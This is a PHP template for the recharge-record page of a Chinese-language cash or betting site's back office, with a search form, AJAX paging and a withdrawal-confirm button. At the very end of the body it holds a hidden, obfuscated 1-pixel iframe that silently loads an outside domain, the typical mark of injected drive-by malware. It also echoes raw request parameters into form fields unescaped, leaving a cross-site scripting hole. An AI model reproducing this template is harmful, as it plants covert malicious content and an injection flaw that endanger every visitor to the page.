<!DOCTYPE HTML>
<html>
<head>
<?php $this->display('inc_skin.php',0,''); ?>
<script type="text/javascript">
$(function(){
	$('.btn_search').click(function(){
		$(this).closest('form').submit();
	});
	//分页
	$('.bottompage a[href]').live('click', function(){
		$('.page_list').load($(this).attr('href'));
		return false;
	});
	$('.sure[id]').click(function(){
		var $this=$(this),
		cashId=$this.attr('id'),
		
		call=function(err, data){
			if(err){
				davidError(err);
			}else{
				this.parent().text('已到帐');
			}
		}
		
		$.ajax('<?=$this->basePath('Cash-toCashSure','',true) ?>?id='+cashId,{
			dataType:'json',
			
			error:function(xhr, textStatus, errThrow){
				call.call($this, errThrow||textStatus);
			},
			
			success:function(data, textStatus, xhr){
				var errorMessage=xhr.getResponseHeader('X-Error-Message');
				if(errorMessage){
					call.call($this, decodeURIComponent(errorMessage), data);
				}else{
					call.call($this, null, data);
				}
			}
		});
	});
});

function BeforeSearchRechargeRecord(){}
function SearchRechargeRecord(err, data){
	if(err){
		davidError(err);
	}else{
		$('.page_list').html(data);
	}
}
</script>
</head> 
<body>
<?php $this->display('inc_header.php'); ?>
<div id="rightcon">
            <div class="wrapper bigbox">
<div class="page-wrapper">
    <?php $this->display('inc_left.php'); ?><div class="top_menu">
        <a class="act" href="<?= $this->basepath('Cash-rechargeLog') ?>">充值记录</a>
        <a href="<?= $this->basepath('Cash-toCashLog') ?>">提现记录</a>
        <a href="<?= $this->basepath('Cash-toCash') ?>">平台提现</a>
        <a href="<?= $this->basepath('Cash-recharge') ?>">自动充值</a>
    </div>
    <div class="page-info">
	 <div class="page_search">
            <table border="0" cellpadding="0" cellspacing="0">
                
                    <tbody><tr><td>
      <form action="<?=$this->basePath('Cash-SearchrechargeLog') ?>" target="ajax" onajax="BeforeSearchRechargeRecord" call="SearchRechargeRecord" dataType="html"> 
  		
           时间：<input type="text" name="fromTime" class="datainput"  value="<?=$this->iff($_REQUEST['fromTime'],$_REQUEST['fromTime'],date('Y-m-d H:i:s',$GLOBALS['fromTime']))?>"/>至<input type="text" name="toTime"  class="datainput" value="<?=$this->iff($_REQUEST['toTime'],$_REQUEST['toTime'],date('Y-m-d H:i:s',$GLOBALS['toTime']))?>"/>
	      	<button name="submit" type="button" class="btn_search btn btn-action" style="position:relative; top:-2px;"><i class="fa fa-search"></i> 搜索 </button>
		</form> 
                        </td>
                    </tr>
                
            </tbody></table>
        </div>
        <div class="clear"></div>
        <div class="page_list">
         <!--下注列表-->
		 <?php $this->display('cash/recharge-log-list.php') ?>
        <!--下注列表 end -->
        </div>
        <div class="clear"></div>
    </div>
    </div>
</div>
</div>
</div><?php $this->display('inc_footer.php'); ?>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>